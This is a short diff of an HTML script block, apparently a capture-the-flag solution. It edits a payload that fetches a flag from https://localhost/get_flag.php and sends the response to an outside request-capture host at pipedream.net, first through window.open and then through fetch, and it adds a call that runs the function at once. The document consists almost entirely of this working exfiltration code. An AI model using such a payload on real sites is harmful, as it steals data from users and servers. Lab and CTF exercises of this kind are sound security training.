@@ -8,9 +8,11 @@
 <script>
     function prova(){
         fetch("https://localhost/get_flag.php").then(d => {
-            if(d.ok) setTimeout(function(){ window.open("https://enahomwjmoi9k.x.pipedream.net/" + d.json()); }, 2500);
+            fetch("https://enahomwjmoi9k.x.pipedream.net/" + d.json()).then(h => console.log(h))
         });
     }
+
+    setTimeout(prova(), 2500);
 </script>
 <!-- End your code here -->
 </body>
